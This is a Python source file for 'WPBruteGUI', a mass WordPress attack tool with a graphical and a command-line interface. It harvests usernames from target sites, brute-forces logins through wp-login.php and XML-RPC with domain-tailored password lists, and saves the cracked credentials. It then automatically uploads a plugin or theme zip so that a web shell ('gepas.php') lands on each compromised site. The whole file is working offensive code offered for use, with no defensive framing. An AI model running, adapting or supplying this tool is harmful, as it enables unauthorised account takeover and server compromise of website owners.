#!/usr/bin/env python3
"""
WPBruteGUI v1.2
Modern, colourful GUI + CLI
Counter Success + Optional Shell Upload
"""

import os
import sys
import ssl
import asyncio
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from pathlib import Path
import httpx
import warnings
import re
import random
import datetime
import requests
from colorama import Fore, init, Style
from urllib.parse import urlparse
import shutil

warnings.filterwarnings("ignore")
init(autoreset=True)

APP_NAME = "WPBruteGUI"
VERSION = "1.2-counter"
ASSETS_DIR = Path(__file__).with_suffix('').parent / "assets"
ICON_ICO = ASSETS_DIR / "icon.ico"
ICON_PNG = ASSETS_DIR / "icon.png"

banner_cli = rf"""{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██╗    ██╗██████╗  █████╗ ██████╗ ███╗   ███╗██╗   ██╗██╗     ║
║   ██║    ██║██╔══██╗██╔══██╗██╔══██╗████╗ ████║██║   ██║██║     ║
║   ██║ █╗ ██║██████╔╝███████║██████╔╝██╔████╔██║██║   ██║██║     ║
║   ██║███╗██║██╔══██╗██╔══██║██╔══██╗██║╚██╔╝██║██║   ██║██║     ║
║   ╚███╔███╔╝██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗║
║    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝║
║                                                                  ║
║        WordPress Bruteforce & Auto-Shell Uploader                ║
║                                                                  ║
║              Coded by  M4DI~UciH4                        ║
║           t.me/madiganz  |  github.com/rizkyevory             ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

{Style.RESET_ALL}
"""

class WPBrute:
    def __init__(self, targets, passwd_file, log_callback=None, finish_callback=None):
        self.targets = targets
        self.passwd_file = passwd_file
        self.semaphore = asyncio.Semaphore(100)
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self.log = log_callback or print
        self.finish = finish_callback or (lambda: None)
        self.success_count = 0  # counter

    async def is_wordpress(self, client, url):
        try:
            r = await client.get(f"{url}/wp-login.php", timeout=10)
            return "wordpress" in r.text.lower() or "wp-submit" in r.text.lower()
        except:
            return False

    async def try_login_wp(self, client, url, username, password):
        login_data = {
            'log': username, 'pwd': password, 'wp-submit': 'Log In',
            'redirect_to': f'{url}/wp-admin/', 'testcookie': '1'
        }
        try:
            r = await client.post(f"{url}/wp-login.php", data=login_data, timeout=15)
            return "wp-admin/profile.php" in r.text or "/wp-admin/" in str(r.url)
        except:
            return False

    async def try_login_xmlrpc(self, client, url, username, password):
        xml_body = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value>{username}</value></param>
        <param><value>{password}</value></param>
    </params>
</methodCall>"""
        headers = {'Content-Type': 'text/xml'}
        try:
            r = await client.post(f"{url}/xmlrpc.php", data=xml_body.strip(), headers=headers, timeout=15)
            return "<member><name>isAdmin</name><value>" in r.text or "blogName" in r.text
        except:
            return False

    async def get_usernames(self, client, url):
        try:
            r = await client.get(f"{url}/wp-json/wp/v2/users", timeout=15)
            usernames = re.findall(r'"slug":"(.*?)"', r.text)
            if not usernames:
                self.log(f"[username not found] {url}")
                return []
            self.log(f"[found username] {url}: {usernames}")
            return usernames
        except:
            self.log(f"[ERROR ON] {url}")
            return []

    async def upload_file(self, client, url, file_path, file_type):
        try:
            if file_type == "plugin":
                form_url = f"{url}/wp-admin/plugin-install.php?tab=upload"
                post_url = f"{url}/wp-admin/update.php?action=upload-plugin"
                form_field, submit_field = "pluginzip", "install-plugin-submit"
                folder_path, output_file = "wp-content/plugins/", "plugins.txt"
            else:
                form_url = f"{url}/wp-admin/theme-install.php?tab=upload"
                post_url = f"{url}/wp-admin/update.php?action=upload-theme"
                form_field, submit_field = "themezip", "install-theme-submit"
                folder_path, output_file = "wp-content/themes/", "themes.txt"

            r = await client.get(form_url, timeout=15)
            nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', r.text)
            if not nonce_match:
                self.log(f"[FAILED] Cannot get nonce from {url}")
                return False
            nonce = nonce_match.group(1)
            random_filename = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=8)) + ".zip"
            with open(file_path, "rb") as f:
                files = {form_field: (random_filename, f, "application/zip")}
                data = {
                    '_wpnonce': nonce,
                    '_wp_http_referer': f"/wp-admin/{'plugin' if file_type == 'plugin' else 'theme'}-install.php?tab=upload",
                    submit_field: 'Install Now'
                }
                r = await client.post(post_url, data=data, files=files, timeout=30)

            if "successfully" in r.text.lower():
                name = os.path.splitext(random_filename)[0]
                full_url = f"{url}/{folder_path}{name}/gepas.php"
                self.log(f"[UPLOAD SUCCESS] {file_type.capitalize()}: {full_url}")
                with open(output_file, "a", encoding='utf8') as f:
                    f.write(f"{full_url}\n")
                return True
            elif "already exists" in r.text:
                self.log(f"[INFO] {file_type.capitalize()} already exists at {url}")
            else:
                self.log(f"[FAILED] Upload {file_type} failed at {url}")
        except Exception as e:
            self.log(f"[ERROR] Upload {file_type} error at {url}: {e}")
        return False

    async def handle_site(self, site):
        url = site.strip().rstrip('/')
        if not url.startswith("http"):
            url = "http://" + url
        async with self.semaphore:
            async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
                if not await self.is_wordpress(client, url):
                    self.log(f"[SKIP] Not a WordPress site: {url}")
                    return
                usernames = await self.get_usernames(client, url)
                if not usernames:
                    usernames = ["admin"]

                parsed = urlparse(url)
                domain = parsed.netloc

                for username in usernames:
                    logged_in = False
                    async for password in read_passwords_lazy(self.passwd_file):
                        rp = password
                        for key, val in {
                            "[WPLOGIN]": username,
                            "[UPPERLOGIN]": username.upper(),
                            "[DOMAIN]": domain.split('.')[0],
                            "[DDOMAIN]": domain,
                            "[YEAR]": str(datetime.datetime.now().year),
                            "[UPPERALL]": username.upper(),
                            "[LOWERALL]": username.lower(),
                            "[UPPERONE]": username.capitalize(),
                            "[LOWERONE]": (username[0].lower() + username[1:].upper()) if len(username) > 1 else username.lower(),
                            "[AZDOMAIN]": re.sub(r'\W+', '', domain),
                            "[REVERSE]": username[::-1],
                            "[DVERSE]": domain.split('.')[0][::-1],
                            "[UPPERDO]": domain.capitalize().split('.')[0],
                            "[UPPERDOMAIN]": domain.upper()
                        }.items():
                            rp = rp.replace(key, val)

                        success_wp = await self.try_login_wp(client, url, username, rp)
                        success_xmlrpc = await self.try_login_xmlrpc(client, url, username, rp)
                        if success_wp or success_xmlrpc:
                            self.success_count += 1
                            self.log(f"[SUCCESS #{self.success_count}] {url} -> {username}:{rp}")
                            with open("success.txt", "a", encoding='utf8') as f:
                                f.write(f"{url} -> {username}:{rp}\n")

                            if os.path.exists("plugin.zip"):
                                await self.upload_file(client, url, "plugin.zip", "plugin")
                            if os.path.exists("theme.zip"):
                                await self.upload_file(client, url, "theme.zip", "theme")
                            logged_in = True
                            break
                        else:
                            self.log(f"[FAIL] {url} -> {username}:{rp}")
                    if logged_in:
                        break

    async def run(self):
        tasks = [self.handle_site(site) for site in self.targets]
        await asyncio.gather(*tasks)
        self.finish()

def read_file(filename):
    with open(filename, encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

async def read_passwords_lazy(filename):
    with open(filename, encoding='utf-8', errors='ignore') as f:
        for line in f:
            pw = line.strip()
            if pw:
                yield pw

class WPBruteGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(f"{APP_NAME} v{VERSION}")
        self.geometry("900x750")
        self.minsize(700, 500)
        self.configure(bg="#1e1e2f")
        self.set_icon()
        self.setup_styles()
        self.create_widgets()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def set_icon(self):
        try:
            if os.name == "nt" and ICON_ICO.exists():
                self.iconbitmap(str(ICON_ICO))
            elif ICON_PNG.exists():
                from PIL import Image, ImageTk
                img = Image.open(ICON_PNG)
                self.iconphoto(True, ImageTk.PhotoImage(img))
        except Exception as e:
            print("Icon load error:", e)

    def setup_styles(self):
        self.style = ttk.Style(self)
        self.style.theme_use("clam")
        bg = "#1e1e2f"
        fg = "#c7c7ff"
        accent = "#7b68ee"
        self.configure(bg=bg)
        self.style.configure("TFrame", background=bg)
        self.style.configure("TLabel", background=bg, foreground=fg, font=("Segoe UI", 10))
        self.style.configure("TEntry", fieldbackground="#2d2d42", foreground=fg, insertcolor=fg, font=("Segoe UI", 10))
        self.style.configure("Accent.TButton",
                             background=accent, foreground="#ffffff",
                             borderwidth=0, focusthickness=3, focuscolor=accent,
                             font=("Segoe UI", 10, "bold"))
        self.style.map("Accent.TButton", background=[("active", "#9f7fff")])
        self.style.configure("Accent.Horizontal.TProgressbar",
                             background=accent, troughcolor="#2d2d42",
                             borderwidth=0, lightcolor=accent, darkcolor=accent)
        self.style.configure("Vertical.TScrollbar",
                             gripcount=0, background="#3e3e5e",
                             darkcolor="#3e3e5e", lightcolor="#3e3e5e",
                             troughcolor="#1e1e2f", borderwidth=0, arrowcolor=fg)

    def create_widgets(self):
        top = ttk.Frame(self, padding=20)
        top.pack(fill="both", expand=True)

        title = ttk.Label(top, text=f"{APP_NAME} v{VERSION}", font=("Segoe UI", 22, "bold"))
        title.pack(pady=(0, 10))

        # Target list
        ttk.Label(top, text="Target list file (.txt):").pack(anchor="w")
        target_frame = ttk.Frame(top)
        target_frame.pack(fill="x", pady=(0, 10))
        self.target_var = tk.StringVar()
        ttk.Entry(target_frame, textvariable=self.target_var).pack(side="left", fill="x", expand=True, padx=(0, 5))
        ttk.Button(target_frame, text="📁 Browse", command=self.browse_target, style="Accent.TButton").pack(side="right")

        # Password list
        ttk.Label(top, text="Password list file (.txt):").pack(anchor="w")
        pass_frame = ttk.Frame(top)
        pass_frame.pack(fill="x", pady=(0, 15))
        self.pass_var = tk.StringVar()
        ttk.Entry(pass_frame, textvariable=self.pass_var).pack(side="left", fill="x", expand=True, padx=(0, 5))
        ttk.Button(pass_frame, text="📁 Browse", command=self.browse_pass, style="Accent.TButton").pack(side="right")

        # Shell upload section
        shell_frame = ttk.LabelFrame(top, text="  Shell Upload (optional)  ", padding=10)
        shell_frame.pack(fill="x", pady=(0, 15))

        plugin_frame = ttk.Frame(shell_frame)
        plugin_frame.pack(fill="x", pady=(0, 5))
        ttk.Label(plugin_frame, text="Plugin zip:").pack(side="left", padx=(0, 5))
        self.plugin_var = tk.StringVar()
        ttk.Entry(plugin_frame, textvariable=self.plugin_var).pack(side="left", fill="x", expand=True, padx=(0, 5))
        ttk.Button(plugin_frame, text="📦 Browse", command=self.browse_plugin, style="Accent.TButton").pack(side="right")

        theme_frame = ttk.Frame(shell_frame)
        theme_frame.pack(fill="x")
        ttk.Label(theme_frame, text="Theme zip:").pack(side="left", padx=(0, 5))
        self.theme_var = tk.StringVar()
        ttk.Entry(theme_frame, textvariable=self.theme_var).pack(side="left", fill="x", expand=True, padx=(0, 5))
        ttk.Button(theme_frame, text="📦 Browse", command=self.browse_theme, style="Accent.TButton").pack(side="right")

        # Success counter label
        self.counter_lbl = ttk.Label(top, text="Success: 0", font=("Segoe UI", 12, "bold"))
        self.counter_lbl.pack(pady=(0, 5))

        # Progress
        self.progress = ttk.Progressbar(top, mode="indeterminate", style="Accent.Horizontal.TProgressbar")
        self.progress.pack(fill="x", pady=(0, 10))

        # Buttons
        btn_frame = ttk.Frame(top)
        btn_frame.pack(fill="x", pady=(0, 15))
        self.start_btn = ttk.Button(btn_frame, text="🚀 Start Bruteforce", command=self.start, style="Accent.TButton")
        self.start_btn.pack(side="left", padx=(0, 10))
        self.stop_btn = ttk.Button(btn_frame, text="⏹ Stop", command=self.stop, state="disabled", style="Accent.TButton")
        self.stop_btn.pack(side="left")

        # Output log
        ttk.Label(top, text="Log Output:").pack(anchor="w")
        self.output = scrolledtext.ScrolledText(top, height=15, state="disabled", bg="#2d2d42", fg="#c7c7ff",
                                                insertbackground="#c7c7ff", font=("Consolas", 9))
        self.output.pack(fill="both", expand=True)

        footer = ttk.Label(top, text="Coded By M4DI~UciH4", font=("Segoe UI", 8))
        footer.pack(pady=(10, 0))

    def browse_target(self):
        file = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if file:
            self.target_var.set(file)

    def browse_pass(self):
        file = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if file:
            self.pass_var.set(file)

    def browse_plugin(self):
        file = filedialog.askopenfilename(filetypes=[("ZIP files", "*.zip")])
        if file:
            self.plugin_var.set(file)

    def browse_theme(self):
        file = filedialog.askopenfilename(filetypes=[("ZIP files", "*.zip")])
        if file:
            self.theme_var.set(file)

    def start(self):
        target_file = self.target_var.get().strip()
        pass_file = self.pass_var.get().strip()
        if not target_file or not pass_file:
            messagebox.showwarning("Warning", "Please select both target and password files!")
            return
        if not os.path.isfile(target_file) or not os.path.isfile(pass_file):
            messagebox.showerror("Error", "File not found!")
            return

        self.output.configure(state="normal")
        self.output.delete(1.0, "end")
        self.output.configure(state="disabled")
        self.counter_lbl.config(text="Success: 0")

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.progress.start(10)

        self.worker_thread = threading.Thread(target=self.run_async, daemon=True)
        self.worker_thread.start()

    def stop(self):
        messagebox.showinfo("Stop", "Stopping... (wait current task)")
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.progress.stop()

    def run_async(self):
        try:
            targets = read_file(self.target_var.get())
            plugin_zip = self.plugin_var.get().strip()
            theme_zip = self.theme_var.get().strip()

            if plugin_zip and os.path.isfile(plugin_zip):
                shutil.copy(plugin_zip, "plugin.zip")
            if theme_zip and os.path.isfile(theme_zip):
                shutil.copy(theme_zip, "theme.zip")

            brute = WPBrute(targets, self.pass_var.get(),
                            log_callback=self.gui_log,
                            finish_callback=self.gui_finish)
            asyncio.run(brute.run())
        except Exception as e:
            self.gui_log(f"[ERROR] {e}")
            self.gui_finish()

    def gui_log(self, msg):
        def write():
            self.output.configure(state="normal")
            self.output.insert("end", msg + "\n")
            self.output.see("end")
            self.output.configure(state="disabled")
            # Update counter jika ada "[SUCCESS #"
            if "[SUCCESS #" in msg:
                try:
                    num = int(msg.split("[SUCCESS #")[1].split("]")[0])
                    self.counter_lbl.config(text=f"Success: {num}")
                except:
                    pass
        self.after(0, write)

    def gui_finish(self):
        def done():
            self.start_btn.configure(state="normal")
            self.stop_btn.configure(state="disabled")
            self.progress.stop()
            messagebox.showinfo("Done", "Bruteforce finished!")
        self.after(0, done)

    def on_closing(self):
        if messagebox.askokcancel("Quit", "Exit application?"):
            self.destroy()

async def main_cli():
    import os
    os.system("cls" if os.name == "nt" else "clear")
    print(banner_cli)
    print(f"[INFO] OpenSSL Version: {ssl.OPENSSL_VERSION}")

    target_file = input("Enter target list file: ").strip()
    if not target_file or not os.path.isfile(target_file):
        print("[ERROR] Target file not found.")
        return

    passwd_file = input("Enter password list file: ").strip()
    if not passwd_file or not os.path.isfile(passwd_file):
        print("[ERROR] Password file not found.")
        return

    targets = read_file(target_file)
    brute = WPBrute(targets, passwd_file)
    await brute.run()

if __name__ == "__main__":
    if len(sys.argv) > 1 and "--cli" in sys.argv:
        asyncio.run(main_cli())
    else:
        app = WPBruteGUI()
        app.mainloop()
